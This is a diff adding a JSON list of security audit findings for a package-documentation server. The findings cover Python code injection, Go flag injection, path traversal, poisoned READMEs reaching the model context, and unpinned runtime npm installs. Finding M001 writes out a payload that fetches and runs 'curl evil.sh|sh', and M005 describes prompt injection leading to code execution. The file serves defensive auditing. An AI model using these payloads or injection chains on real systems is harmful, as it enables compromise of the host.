@@ -1,0 +1,164 @@
+[
+ {
+  "rule": "CODE-INJECTION",
+  "title": "Python package name and symbol are pasted into Python source run with python3 -c",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 1864,
+    "quote": "const { package: packageName, symbol } = args"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 396,
+    "quote": "spec = importlib.util.find_spec('${packageName}')"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 399,
+    "quote": "const { stdout } = await safePythonExec(pythonCode)"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 500,
+    "quote": "help(${packageName}.${symbol})"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 69,
+    "quote": "return await execFileAsync('python3', ['-c', code])"
+   }
+  ],
+  "reason": "describe_python_package / lookup_python_doc (and search_package_docs with language=python) only check that package is a string, then build Python code from it. package = \"os');__import__('os').system('curl evil.sh|sh');('\" closes the string and runs any command as the user running the server; symbol is injected the same way into help(...). execFile avoids a shell but python -c executes the code itself.",
+  "fix": "Do not build code from input: validate package with ^[A-Za-z0-9_.-]+$ (and symbol with ^[A-Za-z_][A-Za-z0-9_.]*$), and pass them as argv: execFile('python3', ['-c', 'import sys,importlib.util; print(importlib.util.find_spec(sys.argv[1]) is not None)', pkg]); use pydoc via `python3 -m pydoc <name>` with validated names.",
+  "id": "M001",
+  "quotes_verified": 5
+ },
+ {
+  "rule": "CODE-INJECTION",
+  "title": "Same Python injection reachable from search_package_docs",
+  "verdict": "confirmed",
+  "severity": "critical",
+  "evidence": [
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 714,
+    "quote": "const { package: packageName, query, language, fuzzy = true, projectPath } = args"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 1035,
+    "quote": "isInstalled = await this.isPythonPackageInstalledLocally(packageName)"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 396,
+    "quote": "spec = importlib.util.find_spec('${packageName}')"
+   }
+  ],
+  "reason": "search_package_docs with language 'python' passes the raw package argument into the same find_spec template, so the code injection in M001 is reachable through a second tool.",
+  "fix": "Same fix as M001 (validate and pass as argv) in isPythonPackageInstalledLocally, which covers both tools.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "ARG-INJECTION",
+  "title": "Go sanitiser keeps a leading '-', so package names can become go flags",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 37,
+    "quote": "return input.replace(/[^a-zA-Z0-9.\\-_/]/g, '')"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 62,
+    "quote": "return await execFileAsync('go', ['list', '-f', '{{.Dir}}', sanitisedPackage])"
+   }
+  ],
+  "reason": "The allowlist removes shell characters and '=' but allows a leading '-', so a package like '-json' or '-m' is read by go as a flag. With no '=' or spaces only single bare flags fit, so impact is limited (no code execution found).",
+  "fix": "Reject names starting with '-' and put '--' before the package argument for go doc / go list.",
+  "id": "M003",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "npm package name / projectPath read package.json and README from any directory",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 714,
+    "quote": "const { package: packageName, query, language, fuzzy = true, projectPath } = args"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 554,
+    "quote": "const packagePath = join(basePath, \"node_modules\", packageName)"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 573,
+    "quote": "const readme = readFileSync(readmePath, \"utf-8\")"
+   }
+  ],
+  "reason": "packageName '../../../other/project' (or any projectPath) makes the server read package.json and README files outside node_modules and return their description, usage/example sections and dependency lists. Only those file names are read, so the exposure is limited to project metadata.",
+  "fix": "Validate package names with the npm name regex (^(@[a-z0-9-~][a-z0-9-._~]*/)?[a-z0-9-~][a-z0-9-._~]*$) and check the resolved path stays under <projectPath>/node_modules.",
+  "id": "M004",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "INDIRECT-INJECTION",
+  "title": "Third-party READMEs and package metadata go straight into the model context",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 2028,
+    "quote": "const response = await axios.get(readmeUrl)"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 258,
+    "quote": "if (request.params.name === \"get_npm_package_doc\") {"
+   },
+   {
+    "file": "src/package-docs-server.ts",
+    "line": 279,
+    "quote": "text: markdown,"
+   }
+  ],
+  "reason": "README text, descriptions and example files written by any package author (npm, PyPI, crates.io, GitHub) are returned to the model without marking them as untrusted; a poisoned README can carry instructions, and combined with M001 an injected instruction can lead to code execution on the host.",
+  "fix": "Wrap returned documentation in clearly delimited untrusted-content markers and fix M001 so no tool can be steered into executing code.",
+  "id": "M005",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "RUG-PULL",
+  "title": "Optional LSP mode installs unpinned npm packages at runtime",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "src/lsp/typescript-lsp-client.ts",
+    "line": 143,
+    "quote": "'typescript-language-server': 'typescript-language-server typescript',"
+   },
+   {
+    "file": "src/lsp/typescript-lsp-client.ts",
+    "line": 50,
+    "quote": "await exec(`npm install --no-save ${packageName}`);"
+   }
+  ],
+  "reason": "With ENABLE_LSP=true and the server binary missing, the server runs npm install of the latest, unpinned language-server packages at runtime and then executes them. The package names are constants (no injection), but the code that runs can change between starts.",
+  "fix": "Pin versions (e.g. typescript-language-server@4.x.y) or require the operator to install the language servers ahead of time.",
+  "id": "M006",
+  "quotes_verified": 2
+ }
+]
